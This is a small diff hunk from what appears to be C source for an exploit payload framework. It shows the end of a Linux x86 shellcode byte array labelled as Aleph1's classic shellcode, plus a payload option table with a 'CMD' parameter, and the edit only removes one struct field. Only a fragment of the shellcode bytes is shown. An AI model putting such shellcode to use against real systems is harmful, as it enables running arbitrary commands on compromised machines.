@@ -13,7 +13,7 @@ unsigned char aleph1_shellcode[] =
 "\x40\xcd\x80\xe8\xdc\xff\xff\xff%s";
 
 struct payloadParam alephsOptions[MAX_NUM_OF_PARAMS] = {
-    { "CMD", 1, STRING, NOT_SET, NULL, NOT_SET },
+    { "CMD", 1, STRING, NULL, NOT_SET },
 };
 // end of aleph1's old shellcode (linux x86)
 
